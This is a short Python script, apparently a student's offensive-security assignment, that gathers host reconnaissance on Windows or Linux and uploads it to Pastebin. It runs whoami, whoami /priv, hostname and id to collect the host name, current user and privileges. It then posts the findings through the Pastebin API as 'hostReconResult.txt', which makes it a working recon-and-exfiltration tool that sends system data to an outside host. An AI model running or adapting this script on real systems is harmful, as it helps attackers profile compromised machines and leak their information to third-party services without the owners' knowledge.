"""
Nama: Williams Kosasi
NIM: 2301926384
Kelas: LA07
"""

import os
import subprocess
import requests

def windows():
    result = subprocess.Popen(args="whoami", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, _ = result.communicate()
    output = output.decode()
    outputList = output.split("\\")
    hostName = outputList[0]
    loggedUser = outputList[1]

    resultPriv = subprocess.Popen(args="whoami /priv", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    outputPriv, _ = resultPriv.communicate()
    outputPriv = outputPriv.decode()

    data = f"====================================================================\nHost Name: {hostName}\nCurrent User: {loggedUser}\n{outputPriv}\n===================================================================="
    return data

def linux():
    resultHostName = subprocess.Popen(args="hostname", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    outputHostName, _ = resultHostName.communicate()
    outputHostName = outputHostName.decode()

    resultCurrentUser = subprocess.Popen(args="whoami", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    outputCurrentUser, _ = resultCurrentUser.communicate()
    outputCurrentUser = outputCurrentUser.decode()

    resultCurrentUserPriv = subprocess.Popen(args="id", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    outputCurrentUserPriv, _ = resultCurrentUserPriv.communicate()
    outputCurrentUserPriv = outputCurrentUserPriv.decode()

    data = f"====================================================================\nHost Name: {outputHostName}\nCurrent User: {outputCurrentUser}\n{outputCurrentUserPriv}\n===================================================================="
    return data

if os.name == "nt":
    data = windows()
    print(data)
else:
    data = linux()
    print(data)

api_dev_key = "" #Masukkan API PasteBin
api_paste_code = data
api_paste_private = 1
api_paste_name = "hostReconResult.txt"
api_option = "paste"

url="https://pastebin.com/api/api_post.php"

payload = {
    'api_dev_key': api_dev_key,
    'api_paste_code': api_paste_code,
    'api_paste_private': api_paste_private,
    'api_paste_name': api_paste_name,
    'api_option': api_option
}

result = requests.post(url, data=payload)
print(f"Result: {result}")